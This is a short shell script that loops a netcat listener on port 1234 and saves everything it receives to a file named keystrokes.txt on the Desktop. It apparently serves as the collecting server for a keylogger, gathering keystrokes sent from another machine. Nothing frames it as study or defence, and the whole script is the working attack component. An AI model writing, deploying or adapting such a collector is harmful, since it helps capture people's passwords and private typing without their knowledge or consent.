#! /bin/sh

while :
do
    nc -vl 1234 > ~/Desktop/keystrokes.txt
    sleep 30
done